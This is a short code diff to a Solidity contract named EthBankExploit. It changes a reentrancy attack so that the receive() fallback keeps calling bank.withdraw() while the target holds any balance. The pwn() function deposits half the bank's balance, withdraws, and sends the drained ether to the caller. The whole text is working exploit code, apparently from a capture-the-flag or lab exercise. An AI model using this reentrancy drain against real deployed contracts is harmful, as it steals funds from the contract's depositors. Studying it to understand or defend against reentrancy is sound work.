@@ -15,14 +15,18 @@ contract EthBankExploit {
     }
 
     receive() external payable {
-        if (address(bank).balance >= 1 ether) {
+        if (address(bank).balance > 0) {
             bank.withdraw();
         }
     }
 
     function pwn() external payable {
-        bank.deposit{value: 1 ether}();
+        uint256 bankBalance = address(bank).balance;
+        if (bankBalance > 0) {
+            uint256 depositAmount = bankBalance / 2;
+            bank.deposit{value: depositAmount}();
         bank.withdraw();
+        }
         payable(msg.sender).transfer(address(this).balance);
     }
 }
